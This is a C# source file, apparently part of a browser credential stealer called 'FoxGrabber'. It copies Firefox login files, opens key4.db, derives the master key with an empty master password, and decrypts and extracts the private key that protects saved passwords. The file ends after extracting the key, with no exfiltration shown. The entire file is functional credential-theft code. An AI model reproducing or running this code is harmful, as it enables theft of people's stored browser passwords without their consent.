namespace FoxGrabber
{
    using FoxGrabber.Cryptography;
    using System;
    using System.Data;
    using System.IO;
    using System.Linq;
    using System.Text;

    internal static partial class Program
    {
        private static void Main()
        {
            Searcher.CopyLoginsInSafeDir();
            Console.ReadLine();

            string MasterPwd = string.Empty;
            bool Verbose = false;
            string filePath = string.Empty;
            var dt = new DataTable();
            var asn = new Asn1Der();

            var db = new BerkeleyDB(Path.Combine(filePath, "key4.db"));

            var pwdCheck = new PasswordCheck((from p in db.Keys where p.Key.Equals("password-check")select p.Value).FirstOrDefault().Replace("-", ""));
            string GlobalSalt = (from p in db.Keys where p.Key.Equals("global-salt") select p.Value).FirstOrDefault().Replace("-", "");
            string f81 = (from p in db.Keys where !p.Key.Equals("global-salt") && !p.Key.Equals("Version") && !p.Key.Equals("password-check") select p.Value).FirstOrDefault().Replace("-", "");

            var CheckPwd = new MozillaPBE(MasterPassword.ConvertHexStringToByteArray(GlobalSalt), Encoding.ASCII.GetBytes(MasterPwd), MasterPassword.ConvertHexStringToByteArray(pwdCheck.EntrySalt));
            CheckPwd.Compute();
            string decryptedPwdChk = TripleDESHelper.DESCBCDecryptor(CheckPwd.Key, CheckPwd.IV, MasterPassword.ConvertHexStringToByteArray(pwdCheck.Passwordcheck));

            Asn1DerObject f800001 = asn.Parse(MasterPassword.ConvertHexStringToByteArray(f81));

            MozillaPBE CheckPrivateKey = new MozillaPBE(MasterPassword.ConvertHexStringToByteArray(GlobalSalt), Encoding.ASCII.GetBytes(MasterPwd), f800001.objects[0].objects[0].objects[1].objects[0].Data);
            CheckPrivateKey.Compute();

            byte[] decryptF800001 = TripleDESHelper.DESCBCDecryptorByte(CheckPrivateKey.Key, CheckPrivateKey.IV, f800001.objects[0].objects[1].Data);

            Asn1DerObject f800001deriv1 = asn.Parse(decryptF800001);
            Asn1DerObject f800001deriv2 = asn.Parse(f800001deriv1.objects[0].objects[2].Data);

            byte[] privateKey = new byte[24];
            if (f800001deriv2.objects[0].objects[3].Data.Length > 24)
            {
                Array.Copy(f800001deriv2.objects[0].objects[3].Data, f800001deriv2.objects[0].objects[3].Data.Length - 24, privateKey, 0, 24);
            }
            else
            {
                privateKey = f800001deriv2.objects[0].objects[3].Data;
            }

        }
    }
}